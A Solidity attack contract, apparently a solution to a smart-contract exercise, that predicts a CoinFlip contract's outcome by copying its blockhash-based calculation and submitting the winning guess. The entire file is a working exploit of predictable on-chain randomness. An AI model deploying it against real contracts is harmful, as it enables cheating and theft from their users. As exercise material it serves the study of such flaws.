// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./CoinFlip.sol";

contract CoinFlipAttack{
    // Create  state variable to represent CoinFlip contract + FACTOR
     CoinFlip public victimContract;
     uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

     // Init the target CoinFlip address...
     
     // We're not using "new" before CoinFlip because
     // We want to interact with the existing contract,
     // not a new instance of it 


     constructor (address _victimContractAddr) public {
         victimContract = CoinFlip(_victimContractAddr);
     }
    // flip functionality to memic the target contracts answer
      function flip() public returns (bool) {
    // Get blockhash of the previous block, then convert to integer (uint256)
        uint256 blockValue = uint256(blockhash(block.number - 1));
    // Take blockvalue and divide by the random seed FACTOR to increase "randomness"    
        uint256 coinFlip = blockValue / FACTOR;
    // Return true if the CoinFlip value == 1 otherwise return false 
         bool side = coinFlip == 1 ? true : false;
          
    // Call flip on the victim contract and pass our guess (e.g side)
          victimContract.flip(side);
      }

}
